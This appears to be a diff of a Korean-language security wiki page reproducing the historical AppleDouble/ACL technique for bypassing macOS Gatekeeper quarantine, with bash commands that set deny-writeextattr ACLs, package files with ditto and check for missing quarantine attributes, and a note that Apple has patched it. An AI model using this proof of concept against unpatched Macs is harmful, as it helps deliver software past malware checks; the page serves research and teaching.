@@ -1,12 +1,71 @@
-# macOS xattr-acls 추가 내용
+# AppleDouble ACL Quarantine Bypass 재현
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-이 역사적인 proof of concept은 Achilles Gatekeeper bypass 연구에서 사용된 AppleDouble/ACL 기법을 재현합니다. ACL을 직렬화하고, AppleDouble sidecar에 저장한 뒤, 속성 이름을 `com.apple.acl.text`로 변경하고 ZIP을 다시 패키징합니다.<sup>[[1]](#references)[[2]](#references)</sup>
+이 역사적인 proof of concept는 Achilles Gatekeeper bypass 연구에서 사용된 AppleDouble/ACL 기법을 재현합니다. ACL을 직렬화해 AppleDouble 사이드카에 저장하고, 속성 이름을 `com.apple.acl.text`로 바꾼 다음 ZIP 파일을 다시 패키징합니다.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Apple은 macOS Ventura 13, Monterey 12.6.2, Big Sur 11.7.2에서 Gatekeeper bypass를 수정했습니다. 현재 Mac에서 ACL을 복원해도 Gatekeeper bypass가 작동함을 입증하는 것은 아닙니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+Apple은 macOS Ventura 13, Monterey 12.6.2, Big Sur 11.7.2에서 Gatekeeper bypass를 수정했습니다. 현재 Mac에서 ACL을 복원해도 Gatekeeper bypass가 작동한다는 것을 보여주지는 않습니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
-quarantine 및 첫 실행 검사에 대해서는 [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses)를 참조하세요.
+Quarantine 및 최초 실행 검사에 대한 내용은 [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses)를 참조하세요.
+
+## ACL 및 AppleDouble 파일 시스템 동작
+
+### writeextattr ACL
+
+이 ACL은 파일에 `xattrs`를 추가하지 못하게 합니다.
+
+```bash
+rm -rf /tmp/test*
+echo test >/tmp/test
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
+ls -le /tmp/test
+ditto -c -k test test.zip
+# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
+
+cd /tmp
+echo y | rm test
+
+# Decompress it with ditto
+ditto -x -k --rsrc test.zip .
+ls -le /tmp/test
+
+# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
+open test.zip
+sleep 1
+ls -le /tmp/test
+```
+
+### **com.apple.acl.text xattr + AppleDouble**
+
+**AppleDouble** 파일 형식은 ACE를 포함해 파일을 복사합니다.
+
+[**소스 코드**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)에서 xattr **`com.apple.acl.text`**에 저장된 ACL 텍스트 표현이 압축 해제된 파일의 ACL로 설정되는 것을 확인할 수 있습니다. 따라서 다른 xattr이 기록되지 못하도록 하는 ACL이 설정된 애플리케이션을 **AppleDouble** 파일 형식의 zip 파일로 압축하면... 해당 애플리케이션에는 quarantine xattr이 설정되지 않습니다.
+
+자세한 내용은 [**원본 보고서**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)를 확인하세요.<sup>[[1]](#references)</sup>
+
+이를 재현하려면 먼저 올바른 ACL 문자열을 가져와야 합니다:
+
+```bash
+# Everything will be happening here
+mkdir /tmp/temp_xattrs
+cd /tmp/temp_xattrs
+
+# Create a folder and a file with the acls and xattr
+mkdir del
+mkdir del/test_fold
+echo test > del/test_fold/test_file
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
+ditto -c -k del test.zip
+
+# uncomporess to get it back
+ditto -x -k --rsrc test.zip .
+ls -le test
+```
+
+(이 방법이 작동하더라도 sandbox가 먼저 quarantine xattr을 기록한다는 점에 유의하세요)
+
+## AppleDouble 사이드카 구성 및 검증
 
 ```bash
 rm -rf /tmp/test*
@@ -191,9 +250,9 @@ xattr -p com.apple.quarantine protected
 
 ## References
 
-- [1] [Microsoft Security Blog — Gatekeeper의 아킬레스건: macOS 취약점 발굴](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
-- [2] [Apple Developer — `ditto`를 사용한 Mac 소프트웨어 배포용 패키징](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
-- [3] [Apple Support — macOS Ventura 13 보안 콘텐츠 정보](https://support.apple.com/en-ae/102853)
-- [4] [Apple Support — macOS Monterey 12.6.2 보안 콘텐츠 정보](https://support.apple.com/en-ae/102806)
-- [5] [Apple Support — macOS Big Sur 11.7.2 보안 콘텐츠 정보](https://support.apple.com/en-us/102785)
+- [1] [Microsoft Security Blog — Gatekeeper의 아킬레스건: macOS 취약점 파헤치기](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
+- [2] [Apple Developer — `ditto`를 사용한 배포용 Mac 소프트웨어 패키징](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
+- [3] [Apple Support — macOS Ventura 13의 보안 콘텐츠 정보](https://support.apple.com/en-ae/102853)
+- [4] [Apple Support — macOS Monterey 12.6.2의 보안 콘텐츠 정보](https://support.apple.com/en-ae/102806)
+- [5] [Apple Support — macOS Big Sur 11.7.2의 보안 콘텐츠 정보](https://support.apple.com/en-us/102785)
 {{#include ../../../../banners/hacktricks-training.md}}
